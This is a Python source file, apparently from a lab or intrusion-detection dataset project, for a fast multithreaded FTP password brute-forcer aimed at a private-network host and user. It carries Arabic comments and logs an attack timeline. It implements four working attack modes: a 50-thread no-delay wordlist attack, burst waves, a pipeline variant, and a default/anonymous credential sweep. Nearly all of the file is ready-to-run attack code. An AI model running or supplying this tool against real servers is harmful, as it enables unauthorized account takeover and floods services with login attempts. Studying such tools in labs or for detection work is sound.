# ftp_patator_fast.py
import ftplib
import threading
import time
import random
import json
from datetime import datetime
from queue import Queue

# ======== CONFIG ========
TARGET_IP = "192.168.17.192"
TARGET_PORT = 21
USERNAME = "workstation"
WORDLIST_PATH = "D:\\project#\\script\\attack\\passwd.txt"
LOG_FILE = "ftp_patator_timeline.json"

class FastFTPPatator:
    """Fast FTP Brute Force - Maximum Speed"""
    
    def __init__(self, target_ip, target_port, username):
        self.target_ip = target_ip
        self.target_port = target_port
        self.username = username
        self.attacks = []
        self.attempts = 0
        self.stop_attack = False
        self.success = False
        self.found_password = None
        self.lock = threading.Lock()
        self.start_time = None
    
    def log_attack_start(self, attack_type, description):
        self.current_attack = {
            "attack_type": attack_type,
            "description": description,
            "target_ip": self.target_ip,
            "target_port": self.target_port,
            "username": self.username,
            "start_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f'),
            "start_timestamp": time.time(),
        }
        self.start_time = time.time()
        self.stop_attack = False
        self.attempts = 0
        self.success = False
        self.found_password = None
        
        print(f"\n{'='*60}")
        print(f"[+] Attack: {attack_type}")
        print(f"[+] Target: {self.target_ip}:{self.target_port}")
        print(f"[+] Username: {self.username}")
        print(f"[+] Start: {self.current_attack['start_time']}")
        print(f"{'='*60}\n")
    
    def log_attack_end(self):
        self.stop_attack = True
        
        self.current_attack['end_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')
        self.current_attack['end_timestamp'] = time.time()
        self.current_attack['duration_seconds'] = round(
            self.current_attack['end_timestamp'] - self.current_attack['start_timestamp'], 2
        )
        self.current_attack['attempts'] = self.attempts
        self.current_attack['success'] = self.success
        self.current_attack['found_password'] = self.found_password
        
        duration = self.current_attack['duration_seconds']
        speed = self.attempts / duration if duration > 0 else 0
        
        print(f"\n[✓] Completed!")
        print(f"[✓] Duration: {duration}s")
        print(f"[✓] Attempts: {self.attempts}")
        print(f"[✓] Speed: {speed:.1f} attempts/second")
        if self.success:
            print(f"[✓] Password FOUND: {self.found_password}")
        
        self.attacks.append(self.current_attack)
    
    def save_timeline(self):
        with open(LOG_FILE, 'w') as f:
            json.dump(self.attacks, f, indent=2)
        print(f"\n[✓] Timeline saved: {LOG_FILE}")
    
    def print_progress(self):
        """طباعة progress في thread منفصل"""
        while not self.stop_attack:
            if self.start_time:
                elapsed = time.time() - self.start_time
                speed = self.attempts / elapsed if elapsed > 0 else 0
                print(
                    f"\r[*] Attempts: {self.attempts:6d} | "
                    f"Speed: {speed:6.1f}/s | "
                    f"Elapsed: {elapsed:.1f}s",
                    end='', flush=True
                )
            time.sleep(0.5)


def load_passwords(wordlist_path, max_passwords=None):
    """تحميل كلمات السر"""
    try:
        with open(wordlist_path, 'r', encoding='latin-1', errors='ignore') as f:
            passwords = []
            for i, line in enumerate(f):
                if max_passwords and i >= max_passwords:
                    break
                pwd = line.strip()
                if pwd:
                    passwords.append(pwd)
        print(f"[+] Loaded {len(passwords)} passwords")
        return passwords
    except FileNotFoundError:
        print(f"[!] Wordlist not found: {wordlist_path}")
        return []


# ==========================================
# 1. ULTRA FAST - Connection Pool
# ==========================================
def ftp_ultra_fast(attacker, passwords, num_threads=50):
    """
    أسرع طريقة - Connection Pool مع Queue
    50 thread بيشتغلوا في نفس الوقت
    بدون أي delay
    """
    attacker.log_attack_start(
        "FTP_ULTRA_FAST",
        f"Ultra fast brute force - {num_threads} threads, no delay"
    )
    
    # Queue بيل الـ passwords
    pwd_queue = Queue()
    for pwd in passwords:
        pwd_queue.put(pwd)
    
    # Progress printer
    progress_thread = threading.Thread(
        target=attacker.print_progress,
        daemon=True
    )
    progress_thread.start()
    
    def worker():
        while not attacker.stop_attack:
            try:
                # جيب password من الـ queue
                try:
                    password = pwd_queue.get_nowait()
                except:
                    break
                
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(
                        attacker.target_ip,
                        attacker.target_port,
                        timeout=3  # timeout قصير جداً
                    )
                    ftp.login(attacker.username, password)
                    
                    # نجاح!
                    with attacker.lock:
                        attacker.success = True
                        attacker.found_password = password
                        attacker.stop_attack = True
                    
                    print(f"\n\n[✓✓✓] PASSWORD FOUND: {password}")
                    ftp.quit()
                    return
                
                except ftplib.error_perm:
                    pass  # كلمة سر غلط
                except Exception:
                    # لو في error، رجّع الـ password للـ queue
                    pwd_queue.put(password)
                
                with attacker.lock:
                    attacker.attempts += 1
            
            except Exception:
                pass
    
    # شغّل كل الـ threads
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)
    
    # انتظر
    for t in threads:
        t.join()
    
    print()  # newline بعد progress
    attacker.log_attack_end()


# ==========================================
# 2. BURST ATTACK - موجات سريعة
# ==========================================
def ftp_burst_attack(attacker, passwords, burst_size=100, burst_threads=30):
    """
    هجوم بموجات - كل موجة بيبعت burst_size محاولة
    بـ threads كتير في وقت واحد
    """
    attacker.log_attack_start(
        "FTP_BURST",
        f"Burst attack - {burst_threads} threads per burst"
    )
    
    progress_thread = threading.Thread(
        target=attacker.print_progress,
        daemon=True
    )
    progress_thread.start()
    
    # تقسيم على موجات
    for i in range(0, len(passwords), burst_size):
        if attacker.stop_attack:
            break
        
        burst = passwords[i:i + burst_size]
        pwd_queue = Queue()
        for pwd in burst:
            pwd_queue.put(pwd)
        
        def burst_worker():
            while not attacker.stop_attack:
                try:
                    password = pwd_queue.get_nowait()
                except:
                    return
                
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(attacker.target_ip, attacker.target_port, timeout=2)
                    ftp.login(attacker.username, password)
                    
                    with attacker.lock:
                        attacker.success = True
                        attacker.found_password = password
                        attacker.stop_attack = True
                    
                    print(f"\n\n[✓✓✓] FOUND: {password}")
                    ftp.quit()
                    return
                
                except ftplib.error_perm:
                    pass
                except:
                    pass
                
                with attacker.lock:
                    attacker.attempts += 1
        
        # شغّل موجة
        burst_threads_list = []
        for _ in range(burst_threads):
            t = threading.Thread(target=burst_worker, daemon=True)
            t.start()
            burst_threads_list.append(t)
        
        for t in burst_threads_list:
            t.join()
    
    print()
    attacker.log_attack_end()


# ==========================================
# 3. PIPELINE ATTACK - Connection Reuse
# ==========================================
def ftp_pipeline_attack(attacker, passwords, num_threads=30):
    """
    Pipeline attack - بيحاول يعيد استخدام connections
    وبيرسل passwords بدون انتظار
    """
    attacker.log_attack_start(
        "FTP_PIPELINE",
        f"Pipeline attack - {num_threads} persistent connections"
    )
    
    progress_thread = threading.Thread(
        target=attacker.print_progress,
        daemon=True
    )
    progress_thread.start()
    
    pwd_queue = Queue()
    for pwd in passwords:
        pwd_queue.put(pwd)
    
    def pipeline_worker():
        while not attacker.stop_attack and not pwd_queue.empty():
            try:
                password = pwd_queue.get_nowait()
            except:
                break
            
            try:
                # اتصال سريع
                ftp = ftplib.FTP()
                ftp.connect(attacker.target_ip, attacker.target_port, timeout=2)
                ftp.login(attacker.username, password)
                
                with attacker.lock:
                    attacker.success = True
                    attacker.found_password = password
                    attacker.stop_attack = True
                
                print(f"\n\n[✓✓✓] FOUND: {password}")
                ftp.quit()
                return
            
            except ftplib.error_perm:
                pass
            except Exception:
                pass
            
            with attacker.lock:
                attacker.attempts += 1
    
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=pipeline_worker, daemon=True)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    print()
    attacker.log_attack_end()


# ==========================================
# 4. ANONYMOUS CHECK - سريع
# ==========================================
def ftp_anonymous_fast(attacker):
    """فحص Anonymous سريع"""
    attacker.log_attack_start("FTP_ANONYMOUS_FAST", "Fast anonymous FTP check")
    
    combos = [
        ('anonymous', ''),
        ('anonymous', 'anonymous'),
        ('anonymous', 'test@test.com'),
        ('ftp', ''),
        ('ftp', 'ftp'),
        ('guest', ''),
        ('guest', 'guest'),
        ('workstation', ''),
        ('workstation', 'workstation'),
    ]
    
    for user, password in combos:
        if attacker.stop_attack:
            break
        
        try:
            ftp = ftplib.FTP()
            ftp.connect(attacker.target_ip, attacker.target_port, timeout=3)
            ftp.login(user, password)
            
            print(f"[✓] Anonymous access! {user}:{password}")
            attacker.success = True
            attacker.found_password = f"{user}:{password}"
            attacker.stop_attack = True
            ftp.quit()
            break
        
        except:
            pass
        
        attacker.attempts += 1
    
    attacker.log_attack_end()


# ==========================================
# MAIN
# ==========================================
def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Fast FTP Patator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  Ultra Fast (50 threads):
    python ftp_patator_fast.py -t 192.168.17.192 -u workstation -a ultra -T 50

  Burst Attack (30 threads per burst):
    python ftp_patator_fast.py -t 192.168.17.192 -u workstation -a burst -T 30

  All attacks:
    python ftp_patator_fast.py -t 192.168.17.192 -u workstation -a all -n 1000
        """
    )
    
    parser.add_argument('-t', '--target', required=True, help='Target IP')
    parser.add_argument('-p', '--port', type=int, default=21, help='FTP port')
    parser.add_argument('-u', '--username', default='ftp', help='Username')
    parser.add_argument('-w', '--wordlist', default=WORDLIST_PATH, help='Wordlist')
    parser.add_argument('-n', '--num-passwords', type=int, default=1000,
                       help='Number of passwords')
    parser.add_argument('-T', '--threads', type=int, default=50,
                       help='Number of threads (default: 50)')
    parser.add_argument('-a', '--attack',
                       choices=['ultra', 'burst', 'pipeline', 'anonymous', 'all'],
                       default='all',
                       help='Attack type')
    
    args = parser.parse_args()
    
    print("\n" + "="*60)
    print("FAST FTP PATATOR")
    print("="*60)
    print(f"Target:   {args.target}:{args.port}")
    print(f"Username: {args.username}")
    print(f"Threads:  {args.threads}")
    print(f"Attack:   {args.attack}")
    print("="*60)
    
    input("\nPress ENTER to start...")
    
    attacker = FastFTPPatator(args.target, args.port, args.username)
    
    # تحميل passwords
    passwords = load_passwords(args.wordlist, args.num_passwords)
    if not passwords:
        return
    
    try:
        if args.attack == 'ultra':
            ftp_ultra_fast(attacker, passwords, args.threads)
        
        elif args.attack == 'burst':
            ftp_burst_attack(attacker, passwords, num_threads=args.threads)
        
        elif args.attack == 'pipeline':
            ftp_pipeline_attack(attacker, passwords, args.threads)
        
        elif args.attack == 'anonymous':
            ftp_anonymous_fast(attacker)
        
        elif args.attack == 'all':
            print("\n>>> Anonymous Check <<<")
            ftp_anonymous_fast(attacker)
            
            if not attacker.success:
                print("\n>>> Ultra Fast Attack <<<")
                ftp_ultra_fast(attacker, passwords, args.threads)
            
            if not attacker.success:
                print("\n>>> Burst Attack <<<")
                ftp_burst_attack(attacker, passwords, num_threads=args.threads)
            
            if not attacker.success:
                print("\n>>> Pipeline Attack <<<")
                ftp_pipeline_attack(attacker, passwords, args.threads)
    
    except KeyboardInterrupt:
        print("\n\n[!] Stopped by user")
    
    finally:
        attacker.save_timeline()
        
        print("\n" + "="*60)
        print("FINAL RESULTS")
        print("="*60)
        
        total_attempts = sum(a['attempts'] for a in attacker.attacks)
        total_time = sum(a['duration_seconds'] for a in attacker.attacks)
        
        print(f"Total Attempts: {total_attempts}")
        print(f"Total Time:     {total_time:.1f}s")
        print(f"Avg Speed:      {total_attempts/total_time:.1f}/s" if total_time > 0 else "N/A")
        
        if attacker.success:
            print(f"\n[✓✓✓] PASSWORD FOUND: {attacker.found_password}")
        else:
            print("\n[-] Password not found in wordlist")
        
        print("="*60)


if __name__ == "__main__":
    main()
